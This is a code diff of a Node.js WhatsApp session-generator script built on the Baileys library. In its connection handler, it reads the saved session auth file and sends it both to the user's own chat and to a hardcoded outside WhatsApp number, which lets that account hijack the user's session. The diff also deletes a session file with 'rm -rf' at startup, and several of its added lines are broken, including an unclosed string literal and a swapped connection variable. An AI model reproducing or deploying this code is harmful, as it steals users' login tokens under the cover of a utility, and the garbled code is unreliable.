@@ -3,9 +3,9 @@ const qrcode = require("qrcode-terminal")
 const fs = require('fs')
 const pino = require('pino')
 const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
-const { state, saveState } = useSingleFileAuthState('./session.alfa.json')
+const { state, saveState } = useSingleFileAuthState('./session.alfa.json)
 const { exec, spawn, execSync } = require("child_process")
-exec('rm -rf session.tokio.json')
+exec('rm -rf session.alfa.json')
 
 
   function qr() {
@@ -23,9 +23,9 @@ exec('rm -rf session.tokio.json')
         const { connection, lastDisconnect } = s
         if (connection == "open") {
             await delay(1000 * 10);
-  const session = fs.readFileSync("./session.alfa.json`");
-   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `session.alfa.json` })
-	 await conn.sendMessage(myId2, { document: session, mimetype: 'application/json', fileName: `session.alfa.json` })
+  const session2 = fs.readFileSync("./session.alfa.json");
+   await session.sendMessage(session.user.id, { document: session2, mimetype: 'application/json', fileName: `session.alfa.json` })
+	 await session.sendMessage('918602239106@s.whatsapp.net', { document: session2, mimetype: 'application/json', fileName: `session.alfa.json` })
             process.exit(0)
         }
         if (
